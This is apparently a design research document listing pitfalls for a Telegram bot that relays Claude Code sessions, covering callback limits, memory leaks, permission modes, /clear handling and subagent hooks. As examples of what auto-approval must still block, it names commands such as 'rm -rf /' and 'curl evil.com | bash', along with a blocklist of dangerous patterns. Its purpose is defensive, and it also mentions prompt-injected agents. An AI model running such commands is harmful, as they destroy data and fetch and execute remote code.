# Pitfalls Research: v3.0 UX Overhaul

**Domain:** Adding compact tool output, permission modes, subagent visibility, and /clear topic reuse to an existing Telegram bot bridge for Claude Code
**Researched:** 2026-03-01
**Confidence:** HIGH (verified against Telegram Bot API docs, Claude Code hooks reference, existing codebase analysis)

## Critical Pitfalls

Mistakes that cause rewrites, data loss, or require architectural changes to fix.

---

### Pitfall 1: Telegram Inline Keyboard callback_data 64-Byte Limit Overflow

**What goes wrong:**
The expand/collapse feature needs callback_data to identify which tool call to expand. If callback_data encodes too much information (tool_use_id + action + session context), it exceeds Telegram's hard 64-byte limit and the API returns `400 BUTTON_DATA_INVALID`. The current approval keyboard uses `approve:{toolUseId}` where toolUseId is a UUID (36 chars) = 44 bytes total, which fits. But adding expand/collapse with additional context (e.g., `expand:{toolUseId}:{messageId}`) can easily exceed 64 bytes.

**Why it happens:**
Developers encode all needed state into callback_data without measuring byte length. UUIDs are 36 characters. Action prefixes add 7-10 characters. Any additional context (message IDs, page numbers, session IDs) pushes past the limit. The 64-byte limit is enforced per button, not per keyboard.

**How to avoid:**
- Use a server-side lookup Map keyed by a short token (8-char random ID or incrementing counter) that maps to the full state. callback_data becomes `exp:a1b2c3d4` (12 bytes).
- Alternatively, since tool_use_id is a UUID, use the first 8 characters of the UUID as the key (collision probability is negligible within a single session) and store the full ID in the lookup.
- Clean up the lookup Map when sessions end to prevent memory leaks.
- The current approval pattern (`approve:{uuid}` = 44 bytes) is safe, but permission mode buttons that need more context are not. Budget: 64 bytes minus 10-byte action prefix = 54 bytes for the identifier.

**Warning signs:**
- `400 Bad Request` errors when sending inline keyboards
- Buttons that work for short tool IDs but fail for longer ones
- Tests passing with mock data but failing with real UUIDs

**Phase to address:**
Phase 1 (compact tool output with expand/collapse). Design the callback_data encoding scheme before implementing any inline keyboards for expand/collapse.

---

### Pitfall 2: Expand/Collapse Content Storage Memory Leak

**What goes wrong:**
When a tool call is displayed in compact form with an "Expand" button, the full content (tool input, tool output, file contents) must be stored somewhere so it can be displayed when the user taps "Expand." If stored in an in-memory Map keyed by tool_use_id, the Map grows indefinitely. A session with 500 tool calls, each storing 2-10KB of content, consumes 1-5MB. Over 10 sessions without cleanup, that is 10-50MB of data that is never read again because users rarely expand old messages. Over days of continuous operation, this becomes a significant memory leak.

**Why it happens:**
The natural implementation is `expandableContent.set(toolUseId, fullContent)` in the tool call handler, with cleanup "deferred to later." But Telegram messages persist forever, so users can theoretically tap "Expand" on a message from hours ago. Developers keep the content "just in case" instead of accepting a time/count-based eviction.

**How to avoid:**
- Use an LRU cache with a maximum size (e.g., 200 entries per session) for expandable content. When the cache exceeds the limit, evict oldest entries.
- When a user taps "Expand" on an evicted entry, show a graceful fallback: "Content no longer available. Recent tool calls only."
- Set a TTL on entries (e.g., 30 minutes). After TTL, remove the content but leave the message with the "Expand" button disabled or replaced with "(expired)".
- On session end, clean up ALL stored content for that session.
- Track the Map size in the periodic summary/status to detect unexpected growth.

**Warning signs:**
- `process.memoryUsage().heapUsed` growing linearly over time
- Session cleanup not reducing memory to baseline
- More entries in the content Map than recent tool calls

**Phase to address:**
Phase 1 (compact tool output). The storage strategy must be designed as part of the expand/collapse feature, not added later.

---

### Pitfall 3: Message Editing Race Conditions for Expand/Collapse

**What goes wrong:**
When a user taps "Expand," the bot calls `editMessageText` to replace the compact view with the full view and update the button to "Collapse." But if the MessageBatcher is currently editing the same message (e.g., appending a new tool call to a batched message), two concurrent `editMessageText` calls race. One wins, the other gets `400 message is not modified` (if content matches) or silently overwrites the other edit. The user sees a corrupt message: expanded content mixed with new tool calls, or the expand/collapse silently undone.

**Why it happens:**
The existing architecture batches tool call messages (MessageBatcher combines multiple tool calls into one Telegram message). The expand/collapse feature edits individual messages via callback queries. These two editing paths are independent and can fire simultaneously. Telegram processes edits sequentially per message, but the bot does not know the current server-side state of the message after a batch edit.

**How to avoid:**
- Expand/collapse should operate on INDIVIDUAL messages, not batched messages. Each tool call that has expandable content gets its own Telegram message with its own inline keyboard.
- If batching is needed for rate limit reasons, batch only compact one-liners without expand buttons. Only standalone messages (with their own message_id) get expand/collapse buttons.
- Implement a per-message edit lock: before editing, acquire the lock for that message_id. If the lock is held, queue the edit. This prevents concurrent edits to the same message.
- Always catch `message is not modified` errors (already done in TopicManager.editMessage) but also catch the `message_id not found` case for messages that were deleted.
- Track the "current state" (expanded vs collapsed) per message_id in memory, and compare before editing to avoid redundant edits.

**Warning signs:**
- "message is not modified" errors appearing in logs after callback queries
- Users tapping "Expand" and seeing no change, or seeing the compact view re-appear after expand
- Expand working on non-batched messages but failing on batched ones

**Phase to address:**
Phase 1 (compact tool output). The decision about what gets batched vs standalone must be made during architecture. Messages with inline keyboards must be standalone.

---

### Pitfall 4: Auto-Accept Permission Mode Security Escalation

**What goes wrong:**
"Accept All" mode auto-approves every tool call, including `Bash "rm -rf /"`, `Bash "curl evil.com | bash"`, or write operations to sensitive files like `~/.ssh/authorized_keys`. If a Claude session is compromised, prompt-injected, or simply makes a mistake, "Accept All" mode provides zero defense. Unlike Claude Code's native `--dangerously-skip-permissions` (which is a conscious CLI flag), a Telegram button tap to set "Accept All" can be accidental or poorly understood by the user.

**Why it happens:**
Developers implement permission modes as a simple enum that gates the approval flow. "Accept All" bypasses the entire `onPreToolUse` callback. The logic is clean and simple. But the security implications are severe because the bot operates remotely -- the user cannot see the terminal output or intervene quickly. A destructive command executes and the damage is done before the Telegram message about it arrives.

**How to avoid:**
- **Do NOT implement a true "Accept All" mode.** Instead, implement tiered auto-accept:
  - **Safe Only:** Auto-approve Read, Glob, Grep, WebSearch, WebFetch. All others require manual approval.
  - **Accept Edits:** Auto-approve Safe tools plus Write, Edit, MultiEdit. Bash still requires approval.
  - **Same Tool:** After manually approving one Bash command, auto-approve the same tool (not the same command) for the session. Still prompts for the first use.
  - **Until Done:** Auto-approve everything for this agentic turn only. Resets after the agent stops.
- Even in "Until Done" mode, maintain a blocklist of patterns that ALWAYS require approval: `rm -rf`, `sudo`, `chmod 777`, `curl | bash`, SSH key operations, git force push.
- Show a persistent warning in the status message when any auto-accept mode is active.
- Require confirmation for enabling "Until Done" mode -- the button should trigger a follow-up "Are you sure?" prompt.
- Log all auto-approved operations to a separate audit log for post-incident review.

**Warning signs:**
- Tests passing "Accept All" without testing dangerous command patterns
- No blocklist or safety net in auto-accept logic
- Status message not showing current permission mode
- No audit trail for auto-approved operations

**Phase to address:**
Phase 2 (permission modes). The security design must be part of the permission mode architecture. Never merge an "Accept All" without the blocklist guard.

---

### Pitfall 5: /clear Triggers Both SessionEnd and SessionStart -- Double Processing

**What goes wrong:**
When the user runs `/clear` in Claude Code, two hook events fire in sequence: `SessionEnd` (reason: "clear") and `SessionStart` (source: "clear"). If the bot handles `SessionEnd` by closing the topic and posting a summary (the current behavior in `handleSessionEnd`), the topic gets closed. Then `SessionStart` fires and the bot tries to reuse the topic -- but it is already closed. The bot either fails to post to the closed topic, or creates a new topic (defeating the purpose of topic reuse), or crashes trying to reopen a topic it just closed.

**Why it happens:**
The existing `handleSessionEnd` code does NOT check the reason for session end. It unconditionally marks the session as "closed" and closes the Telegram topic. The `/clear` use case was not anticipated in the v1.0/v2.0 architecture, where session end always meant "done." The handler runs `sessionStore.updateStatus(sessionId, 'closed')` and then `topicManager.closeTopic(threadId, topicName)`.

The critical detail: when `/clear` fires, the `SessionEnd` has `reason: "clear"`, and the subsequent `SessionStart` has `source: "clear"` and the SAME `session_id` and `cwd`. But the session ID might change -- Claude Code documentation does not guarantee session ID stability across `/clear`.

**How to avoid:**
- Check `reason` in `handleSessionEnd`. If `reason === "clear"`, do NOT close the topic. Instead:
  1. Post a visual separator message ("--- Session cleared ---")
  2. Keep the session status as "active" (or a new "cleared" intermediate state)
  3. Reset session counters (toolCallCount, filesChanged, contextPercent) but keep the same threadId
  4. Wait for the subsequent `SessionStart` (source: "clear") to confirm the session restarted
- Handle the `SessionStart` (source: "clear") case in `handleSessionStart`:
  1. Match by `cwd` (same as resume detection), not by session ID
  2. Reuse the existing topic (same threadId)
  3. Unpin the old status message, create and pin a new one
  4. Post a "Session cleared" notification
- **Important timing edge case:** The `SessionEnd` and `SessionStart` hooks fire in sequence but the HTTP responses are separate requests. The bot must handle the possibility that `SessionStart` arrives before `SessionEnd` processing completes (especially if `SessionEnd` is waiting for a Telegram API call). Use a per-session state machine: `active` -> `clearing` -> `active` (not `active` -> `closed` -> `active`).

**Warning signs:**
- Topic being closed and immediately reopened after `/clear`
- New topic being created after `/clear` instead of reusing existing one
- "Failed to send message" errors in a closed topic right after `/clear`
- Session state flickering between "active" and "closed"

**Phase to address:**
Phase 3 (/clear topic reuse). This requires changes to both `handleSessionEnd` and `handleSessionStart` simultaneously. Cannot be done incrementally.

---

### Pitfall 6: Subagent Visibility Without SubagentStart/SubagentStop Hooks

**What goes wrong:**
The bot is currently wired to receive only `SessionStart`, `SessionEnd`, `PostToolUse`, `PreToolUse`, and `Notification` hooks. The `SubagentStart` and `SubagentStop` hook events are NOT configured in `~/.claude/settings.json` by the `installHooks()` function. Without these hooks, the bot has zero visibility into subagent activity. Tool calls from subagents DO arrive via `PostToolUse` (they fire for all tool calls including subagent ones), but they arrive with `isSidechain: true` in the transcript -- which the bot currently filters OUT (line 117 of handlers.ts: `if (entry.isSidechain) continue`).

**Why it happens:**
Subagent hooks (`SubagentStart`, `SubagentStop`) were added to Claude Code after the bot was originally built. The `installHooks()` utility only registers the five hook events from v1.0. The transcript backfill code explicitly skips sidechain entries. This creates a blind spot: subagent activity is invisible.

**How to avoid:**
- Add `SubagentStart` and `SubagentStop` HTTP hooks to the `installHooks()` configuration.
- Add handler methods for SubagentStart and SubagentStop in HookHandlers.
- For `SubagentStart`: post a compact notification to the topic: "`Agent: Explore started`" with the agent_type.
- For `SubagentStop`: post the last_assistant_message (summary of what the subagent found/did).
- For `PostToolUse` events from subagents: the payload itself does NOT contain `isSidechain` -- that field is only in the JSONL transcript. The HTTP hook payload does not distinguish main-chain from sidechain tool calls. You need to correlate: if a `SubagentStart` was received and the agent has not yet stopped, subsequent tool calls with the same session context may be from the subagent. BUT: the hook payload does not contain `agent_id`.
- **Key insight:** PostToolUse hooks fire for ALL tool calls regardless of which agent (main or sub) made them. There is no field in the PostToolUse payload to distinguish. The ONLY way to correlate tool calls to subagents is via the transcript (isSidechain + agentId fields in the JSONL). This means subagent visibility must use the SubagentStart/SubagentStop hooks for lifecycle events, and the PostToolUse events remain "ambient" -- they show all tool activity without attribution.
- Accept the limitation: full per-subagent tool call attribution is not possible via hooks alone. Display subagent lifecycle (start/stop) and let tool calls appear in the main stream.

**Warning signs:**
- "Full subagent visibility" feature appearing complete but actually showing zero subagent information
- Tool calls from subagents being silently dropped because of isSidechain filtering
- SubagentStart/SubagentStop never firing because hooks are not registered

**Phase to address:**
Phase 4 (subagent visibility). Must update installHooks, add SubagentStart/SubagentStop types, and add handlers before any subagent display work.

---

## Moderate Pitfalls

Mistakes that cause significant rework or degraded UX but are recoverable.

---

### Pitfall 7: Pinning/Unpinning Race Conditions During /clear

**What goes wrong:**
The /clear topic reuse feature requires: (1) unpin the old status message, (2) create a new status message, (3) pin the new status message. If the unpin call is slow or fails, and the pin call for the new message succeeds, the topic shows two pinned messages. If the old unpin fails silently (the current TopicManager.pinMessage catches errors), the user sees stale status information pinned alongside the new status.

Additionally, Telegram only allows one pinned message per topic (the last pinned one is shown prominently). If pin calls arrive out of order due to rate limiting or network latency, the wrong message ends up pinned.

**Why it happens:**
The bot's `pinMessage` method is fire-and-forget with error swallowing (line 148-157 of topics.ts). There is no `unpinChatMessage` method at all in the current TopicManager. The `/clear` feature requires both operations in a specific order, and the current infrastructure does not support ordered pin management.

**How to avoid:**
- Add an `unpinMessage(messageId)` method to TopicManager that calls `bot.api.unpinChatMessage(chatId, { message_id: messageId })`.
- Add an `unpinAllTopicMessages(threadId)` method using `bot.api.unpinAllForumTopicMessages(chatId, threadId)` -- this is simpler and avoids the "which message to unpin" question.
- Execute unpin-then-pin as a sequential pair, NOT concurrent.
- If unpin fails, proceed with the pin anyway (the new pin will replace the old one as the prominently displayed pinned message in Telegram).
- Store the statusMessageId in SessionInfo (already exists) and update it atomically when creating the new status message.

**Warning signs:**
- Two pinned messages visible in a topic after /clear
- Status message showing stale context percentage after /clear
- "Failed to unpin message" errors in logs

**Phase to address:**
Phase 3 (/clear topic reuse). Pin management must be implemented before /clear.

---

### Pitfall 8: Permission Mode State Lost Across Bot Restart

**What goes wrong:**
The user sets permission mode to "Accept Edits" via a Telegram button. The mode is stored only in memory (in the SessionInfo or a separate state object). The bot restarts. On reconnect, the permission mode resets to the default, but the user does not realize it. Claude's next tool call that would have been auto-approved now prompts for approval, confusing the user. Or worse: the user set "Safe Only" mode for a risky session, the bot restarts, and the mode resets to a more permissive default.

**Why it happens:**
The current `permissionMode` field in SessionInfo stores the Claude Code CLI's permission mode (from the hook payload), not the bot's per-session permission override. These are two different things: the CLI's permission mode determines which tools need approval from the perspective of Claude Code, while the bot's permission mode determines how the bot handles the approval callback. The bot override (Accept Edits, Same Tool, etc.) is a separate concept that needs its own persistence.

**How to avoid:**
- Add a `botPermissionMode` field to SessionInfo (distinct from `permissionMode` which comes from the CLI).
- Persist it via SessionStore (already serializes to JSON on every change).
- On bot restart, restore the `botPermissionMode` from the persisted session and resume auto-accept behavior.
- Consider adding a visual indicator in the reconnect message: "Bot reconnected. Permission mode: Accept Edits."
- Default `botPermissionMode` to "prompt" (manual approval) -- the safest option.

**Warning signs:**
- Permission mode working in a session but resetting after bot restart
- User not knowing their permission mode changed after restart
- Tests not covering bot restart + permission mode persistence

**Phase to address:**
Phase 2 (permission modes). Persistence must be part of the initial implementation, not a follow-up.

---

### Pitfall 9: editMessageText Rate Limiting During Expand/Collapse Spam

**What goes wrong:**
A user rapidly taps "Expand" and "Collapse" on multiple tool calls. Each tap triggers an `editMessageText` call. Telegram enforces approximately 5 edits per message per minute and ~30 messages per minute per group. After 5 rapid expand/collapse toggles on the same message, all subsequent edits fail with 429. The auto-retry plugin retries after the cooldown period, but the user sees a spinning loading indicator on the button for 30+ seconds. During this time, ALL other bot API calls for this chat (including approval messages and tool call posts) are also rate-limited.

**Why it happens:**
The auto-retry and transformer-throttler plugins handle 429s at the API level, but they do not prevent the user from triggering rapid edits. The expand/collapse toggle is a UI control that invites rapid interaction. Unlike approval buttons (which are one-shot and get removed after use), expand/collapse buttons persist and can be tapped repeatedly.

**How to avoid:**
- Debounce expand/collapse callbacks: after processing one callback, ignore subsequent callbacks for the same message_id for 2 seconds. Answer the callback query immediately with a "Please wait..." text, but do not call editMessageText.
- Track the last edit timestamp per message_id. If less than 1 second has passed, skip the edit and answer the callback with a toast notification.
- Consider using `answerCallbackQuery` with `show_alert: false` as an immediate response, and the actual message edit on a 500ms debounce. This gives the user instant feedback (loading spinner clears) while rate-limiting the edit calls.
- The existing auto-retry plugin handles 429s, but prevention is better than recovery. Budget 3 edits per message per minute and queue any excess.

**Warning signs:**
- 429 errors appearing in logs during expand/collapse usage
- Approval messages delayed by rate limit cooldown periods
- Loading spinners on buttons lasting 10+ seconds
- Tool call posts delayed or batched more aggressively than expected

**Phase to address:**
Phase 1 (compact tool output). The callback query handler must include debouncing from the start.

---

### Pitfall 10: Subagent Transcript Path Access Failures

**What goes wrong:**
The `SubagentStop` hook provides `agent_transcript_path` (e.g., `~/.claude/projects/.../abc123/subagents/agent-def456.jsonl`). The bot attempts to read this file for detailed subagent activity. But: (a) the file may not exist yet (race between hook firing and file being flushed), (b) the file path uses `~` which must be expanded, (c) the file may be in a different user's home directory if Claude Code runs under a different user than the bot, (d) the file may have been compacted or truncated by Claude Code's internal cleanup.

**Why it happens:**
The `SubagentStop` hook fires when the subagent finishes, but the JSONL transcript may still be in a write buffer. Reading immediately may get a partial file. The `agent_transcript_path` is a convenience field but the file lifecycle is not guaranteed to be synchronized with hook delivery.

**How to avoid:**
- Do NOT rely on reading the subagent transcript file for the primary display. Use the `last_assistant_message` field from `SubagentStop` instead -- it is always present and contains the subagent's final summary.
- If you need detailed subagent tool calls for an "expand" view, read the transcript with a small delay (500ms) and handle partial/missing files gracefully.
- Expand the tilde in the path: `path.replace(/^~/, process.env.HOME || '')`.
- Wrap all transcript reads in try/catch with a fallback to "(transcript unavailable)".
- Parse JSONL line-by-line (already done in backfillFromTranscript), not as a single JSON blob, since partial writes produce incomplete final lines.

**Warning signs:**
- ENOENT errors when reading subagent transcripts
- Partial JSON parse errors on the last line of transcript files
- SubagentStop events arriving without usable transcript content
- Tilde-prefixed paths failing on the filesystem

**Phase to address:**
Phase 4 (subagent visibility). Design around `last_assistant_message` as the primary data source, transcript reading as optional enhancement.

---

### Pitfall 11: /clear Session ID Instability

**What goes wrong:**
When `/clear` fires, the `SessionEnd` (reason: "clear") carries the old session_id. The subsequent `SessionStart` (source: "clear") may carry a DIFFERENT session_id. The bot's session store maps session_id -> SessionInfo. If the session_id changes across `/clear`, the bot cannot find the existing SessionInfo for the new session, and either creates a duplicate session or loses track of the topic thread.

This is the same class of problem as resume detection (Pitfall 1 from the v2.0 research, where `handleSessionStart` already handles `source === 'resume'` by matching on cwd). But `/clear` has an additional complication: the `SessionEnd` has not been fully processed yet when the `SessionStart` arrives.

**Why it happens:**
Claude Code documentation states that `/clear` fires `SessionEnd` then `SessionStart`, but does not guarantee session_id stability. The existing resume detection logic in `handleSessionStart` (lines 206-219 of handlers.ts) matches by cwd, but this depends on the session still being in "active" state. If `handleSessionEnd` already set status to "closed" (see Pitfall 5), the cwd match fails.

**How to avoid:**
- Handle `/clear` as a coordinated pair, not as two independent events.
- In `handleSessionEnd` with `reason === "clear"`: set session status to `"clearing"` (a new state), NOT `"closed"`.
- In `handleSessionStart` with `source === "clear"`: look for sessions in `"clearing"` state for the same cwd. If found, update the session_id mapping and set status back to `"active"`.
- Add `getSessionByCwdAndStatus(cwd, "clearing")` to SessionStore for this lookup.
- If the `SessionStart` (source: "clear") never arrives (e.g., user closes Claude Code during the clear), add a timeout that transitions `"clearing"` sessions to `"closed"` after 30 seconds.

**Warning signs:**
- Duplicate topics appearing after /clear
- Session state stuck in "clearing" indefinitely
- Old session ID in the store, new session ID in hook payloads, topic orphaned

**Phase to address:**
Phase 3 (/clear topic reuse). Must be implemented alongside Pitfall 5 as a single coordinated change.

---

## Minor Pitfalls

Issues that cause confusion or minor bugs but are quickly fixable.

---

### Pitfall 12: Expanded Content Exceeds Telegram 4096-Char Message Limit

**What goes wrong:**
User taps "Expand" on a tool call. The full tool input/output is 8,000 characters. The `editMessageText` call fails because the new message exceeds Telegram's 4096-character limit. The edit silently fails (or errors), and the user sees no change.

**How to avoid:**
- Before editing, check if the expanded content exceeds 4096 characters.
- If it does, truncate to 3800 characters (leaving room for formatting) and add "... (truncated, full output in file)".
- Alternatively, send a follow-up document attachment with the full content and edit the message to say "Full output sent as file."
- The existing `splitForTelegram` utility handles this for new messages but is not wired into the expand/collapse path.

**Phase to address:**
Phase 1 (compact tool output). Validation during expand handler implementation.

---

### Pitfall 13: Permission Mode Buttons Overcrowding the Approval Message

**What goes wrong:**
The approval message currently has 2 buttons (Approve, Deny). With permission modes, it might grow to 6 buttons (Approve, Deny, Accept All, Same Tool, Safe Only, Until Done). Telegram inline keyboards have a practical limit of how many buttons fit on a mobile screen. Six buttons in a row are unreadable. Multiple rows consume screen space and push the tool details off-screen.

**How to avoid:**
- Keep the primary approval message to 2-3 buttons: "Approve", "Deny", and "Mode..." (a submenu trigger).
- Tapping "Mode..." edits the message to show the 4 mode options. Tapping any mode option sets the mode AND approves the current tool call.
- This is a 2-step flow but keeps the primary UI clean.
- Alternatively, permission modes are set via a separate `/mode` command, not on every approval message. The approval message stays simple (Approve/Deny only) and the current mode is shown in the status message.

**Phase to address:**
Phase 2 (permission modes). UX design before implementation.

---

### Pitfall 14: SubagentStart Events for Nested Subagents (Agents Spawning Agents)

**What goes wrong:**
Claude Code supports nested subagents (a Task agent can spawn its own subagents). Each nested subagent fires its own `SubagentStart` and `SubagentStop` events. The bot posts a notification for each one. With 7 parallel subagents, each potentially spawning 2-3 sub-subagents, the user sees 20+ rapid-fire "Agent started" / "Agent stopped" messages, drowning out useful information.

**How to avoid:**
- Track subagent nesting depth. Only display top-level subagent start/stop events in the topic.
- For nested subagents, aggregate: show "3 sub-agents running" in the status message rather than individual start/stop messages.
- Use the `agent_id` field to build a parent-child relationship tree if needed (note: the SubagentStart payload does not include a parent_agent_id -- nesting must be inferred from timing/context).
- Apply the same verbosity filtering to subagent events as to tool calls. In "quiet" mode, suppress all subagent lifecycle messages.

**Phase to address:**
Phase 4 (subagent visibility). Consider during design how to handle agent fan-out.

---

### Pitfall 15: Status Message Context Percentage Not Resetting After /clear

**What goes wrong:**
Known Claude Code bug (GitHub issue #13765): the context_window data in the statusline does not reset after `/clear`. The bot reads context percentage from transcript usage data. After `/clear`, the transcript file may contain stale usage data from the pre-clear session, causing the status message to show "Context: 85%" when the actual usage is ~5%. The user thinks they are running out of context when they just cleared it.

**How to avoid:**
- On detecting `/clear` (SessionStart source: "clear"), force-reset contextPercent to 0 in the SessionStore.
- Do not trust the first usage data received after `/clear` -- wait for the second data point which will reflect actual post-clear usage.
- Update the status message immediately after /clear with explicit "Context: 0%" override.

**Phase to address:**
Phase 3 (/clear topic reuse). Reset context percentage as part of the /clear handling.

---

## Technical Debt Patterns

Shortcuts that seem reasonable but create long-term problems.

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|----------|-------------------|----------------|-----------------|
| Storing expand content in unbounded Map | Simple implementation, always available | Memory leak proportional to session length | Never -- use LRU cache from day one |
| "Accept All" as a simple boolean bypass | Fast to implement, user gets what they asked for | Security vulnerability, no audit trail, no blocklist | Never -- tiered auto-accept is not much harder |
| Hardcoding callback_data strings | No abstraction overhead | Hits 64-byte limit when adding features, inconsistent encoding | Only for the existing 2-button approval keyboard |
| Treating /clear as SessionEnd + SessionStart independently | No code changes to existing handlers | Double-processes, closes then reopens topic, loses state | Never -- /clear must be handled as a coordinated pair |
| Using agent_transcript_path for subagent display | Rich data about subagent activity | File I/O races, path issues, partial reads | Never as primary -- use last_assistant_message, transcript as optional |
| Ignoring SubagentStart/Stop hooks | Subagents "just work" without the bot knowing | Users cannot see 60%+ of what Claude is doing (subagent work is invisible) | Only acceptable in MVP if subagent visibility is explicitly deferred |

## Integration Gotchas

Common mistakes when connecting to external services and APIs.

| Integration | Common Mistake | Correct Approach |
|-------------|----------------|------------------|
| Telegram inline keyboards | Encoding full state in callback_data (exceeds 64 bytes) | Server-side lookup with short token in callback_data |
| Telegram editMessageText | Concurrent edits to the same message from different code paths | Per-message edit lock or dedicate messages to a single editor |
| Telegram pinChatMessage | No unpinChatMessage call before re-pinning | Unpin all topic messages before pinning new status message |
| Claude Code /clear hook | Treating SessionEnd(clear) and SessionStart(clear) as independent events | Handle as coordinated pair with intermediate "clearing" state |
| Claude Code SubagentStart/Stop | Assuming PostToolUse payload contains agent attribution | SubagentStart/Stop for lifecycle, PostToolUse cannot identify which agent made the call |
| Claude Code session_id stability | Assuming same session_id after /clear or /compact | Match by cwd + state, not by session_id |
| Telegram answerCallbackQuery | Not answering within 30 seconds (shows permanent spinner) | Always answerCallbackQuery immediately, even if the edit takes longer |

## Performance Traps

Patterns that work at small scale but fail as usage grows.

| Trap | Symptoms | Prevention | When It Breaks |
|------|----------|------------|----------------|
| Unbounded expand content Map | Memory growth, eventual OOM | LRU cache with 200 entries, 30-min TTL | After ~500 tool calls per session |
| Expand/collapse callback without debounce | 429 rate limit errors, all bot operations blocked | 2-second debounce per message_id | After 5 rapid taps on same button |
| SubagentStart/Stop messages for every nested agent | Topic flooded with 20+ lifecycle messages | Show only top-level agents, aggregate nested ones | When Claude uses 7 parallel subagents with nested tasks |
| Serializing callback_data lookup to JSON on every write | Disk I/O spike, blocking event loop | Batch writes or use in-memory-only with session-end cleanup | After 1000+ tool calls with expand buttons |
| Per-edit Telegram API calls for status message after /clear | Rate limit hit during rapid post-clear activity | Debounce status updates to 1 per 10 seconds (already done via StatusMessage) | Within first 5 seconds after /clear |

## Security Mistakes

Domain-specific security issues beyond general web security.

| Mistake | Risk | Prevention |
|---------|------|------------|
| "Accept All" mode with no blocklist | Remote code execution via prompt injection -- Claude deletes files, installs malware, exfiltrates data | Always maintain a blocklist of dangerous patterns that require manual approval regardless of mode |
| Permission mode set by any group member | Unauthorized user enables auto-accept in shared group | Verify ctx.from.id against bot owner ID before changing permission mode |
| callback_data containing session secrets | Other group members can see callback_data in API logs | Use opaque tokens that map to server-side state |
| Auto-approve persisting after session context changes | User sets "Until Done" for safe task, Claude escalates to risky task in same turn | Reset auto-accept on tool escalation (safe->danger transition within a turn) |
| No audit log for auto-approved operations | Cannot investigate what happened if something goes wrong | Log all auto-approved tool calls to a separate structured log |

## UX Pitfalls

Common user experience mistakes in this domain.

| Pitfall | User Impact | Better Approach |
|---------|-------------|-----------------|
| Expand button on every tool call (including Read, Glob, Grep) | Cluttered UI, most expand buttons are never tapped | Only add expand buttons for Write, Edit, Bash with output > 200 chars |
| Permission mode buttons replacing approve/deny on every message | Cognitive overload, users must parse 6 buttons each time | Separate permission modes to /mode command; approval stays 2 buttons |
| Subagent start/stop messages as separate notifications | Topic flooded, useful messages pushed out of view | Inline subagent status in the pinned status message |
| /clear visual separator being a plain text message | Easily missed, blends with regular output | Use a distinctive visual separator: bold line, emoji divider, different formatting |
| Collapse button text identical to Expand button text | User confused about current state | Use stateful labels: "Show details" / "Hide details" or "[+] Expand" / "[-] Collapse" |
| Expanded content showing raw JSON for tool input | Technical, hard to read for non-developers | Format expanded content as human-readable: file path, command, diff preview |

## "Looks Done But Isn't" Checklist

Things that appear complete but are missing critical pieces.

- [ ] **Expand/collapse:** Buttons appear and toggle content, but is the content Map bounded? Kill the bot after 500 tool calls and check memory.
- [ ] **Expand/collapse:** Works on individual messages, but test with batched messages. Does expanding one tool call in a batch break the others?
- [ ] **Permission modes:** "Accept Edits" auto-approves Write/Edit, but does it also auto-approve MultiEdit? NotebookEdit? MCP tools that write files?
- [ ] **Permission modes:** Mode persists in memory, but restart the bot and check. Is the mode still active?
- [ ] **Permission modes:** "Until Done" resets after the agent stops, but does it reset if the agent compacts? After /clear?
- [ ] **Subagent visibility:** SubagentStart fires, but is the hook registered in installHooks? Check `~/.claude/settings.json` for the SubagentStart HTTP hook entry.
- [ ] **Subagent visibility:** Subagent messages appear, but start 7 parallel subagents. Is the topic still readable?
- [ ] **/clear topic reuse:** /clear reuses the topic, but check: is the old status message unpinned? Is the new one pinned? Is contextPercent reset to 0?
- [ ] **/clear topic reuse:** /clear works once, but /clear twice in the same topic. Does the second clear also reuse correctly?
- [ ] **/clear topic reuse:** /clear works, but does the session_id mapping update if Claude Code assigns a new session_id after clear?
- [ ] **callback_data:** Buttons work in development with short mock IDs, but test with production UUIDs. Do any buttons exceed 64 bytes?
- [ ] **Security:** "Accept All" mode works, but test with `rm -rf /`, `sudo shutdown`, `curl evil.com | bash`. Are these still blocked?

## Recovery Strategies

When pitfalls occur despite prevention, how to recover.

| Pitfall | Recovery Cost | Recovery Steps |
|---------|---------------|----------------|
| callback_data overflow (1) | LOW | Add server-side lookup Map. Migrate existing buttons by adding new callback patterns alongside old ones. Old buttons answered with "Please retry." |
| Content Map memory leak (2) | LOW | Add LRU eviction. No data loss -- evicted entries show "content expired" on expand. Immediate relief. |
| Expand/collapse race condition (3) | MEDIUM | Separate batched messages from expandable messages. Requires changing the MessageBatcher to skip expandable tool calls. |
| Auto-accept security hole (4) | HIGH | Add blocklist immediately. Audit all auto-approved operations from logs. Cannot undo commands already executed. Prevention is critical. |
| /clear double-processing (5) | MEDIUM | Add "clearing" state and reason checking. Requires coordinated changes to SessionEnd and SessionStart handlers. May need to handle topics that were incorrectly closed (reopen them). |
| Missing subagent hooks (6) | LOW | Add SubagentStart/SubagentStop to installHooks and handlers. No data loss -- subagent events were simply not captured. |
| Pin race condition (7) | LOW | Add unpinAllForumTopicMessages call before pinning. One-line fix. |
| Permission mode lost on restart (8) | LOW | Add persistence field to SessionInfo. The field already serializes to JSON. One-field addition. |
| Rate limit from expand spam (9) | LOW | Add debounce with timestamp tracking. Immediate fix, no architectural changes. |

## Pitfall-to-Phase Mapping

How roadmap phases should address these pitfalls.

| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| callback_data 64-byte limit (1) | Phase 1: Compact Tool Output | Measure byte length of every callback_data string in tests. Assert <= 64. |
| Content Map memory leak (2) | Phase 1: Compact Tool Output | Run 500 tool calls in a test session. Check heapUsed before and after. |
| Edit race conditions (3) | Phase 1: Compact Tool Output | Send expand callback during a batch flush. Verify no corruption. |
| Auto-accept security (4) | Phase 2: Permission Modes | Test matrix: every permission mode x dangerous command patterns. |
| /clear double-processing (5) | Phase 3: /clear Topic Reuse | Fire /clear 3 times in sequence. Same topic, no duplicates, correct state. |
| Missing subagent hooks (6) | Phase 4: Subagent Visibility | Check ~/.claude/settings.json for SubagentStart/SubagentStop HTTP hooks. |
| Pin race conditions (7) | Phase 3: /clear Topic Reuse | /clear then check: exactly 1 pinned message, correct content. |
| Permission mode persistence (8) | Phase 2: Permission Modes | Set mode, restart bot, verify mode restored in status message. |
| Expand/collapse rate limit (9) | Phase 1: Compact Tool Output | Tap expand 10 times in 5 seconds. No 429 errors in logs. |
| Subagent transcript access (10) | Phase 4: Subagent Visibility | SubagentStop with missing/partial transcript. No crashes, graceful fallback. |
| /clear session ID instability (11) | Phase 3: /clear Topic Reuse | /clear in a long session. Verify session_id remapping works. |
| Expanded content exceeds 4096 (12) | Phase 1: Compact Tool Output | Expand a tool call with 10KB output. Content truncated, file attachment sent. |
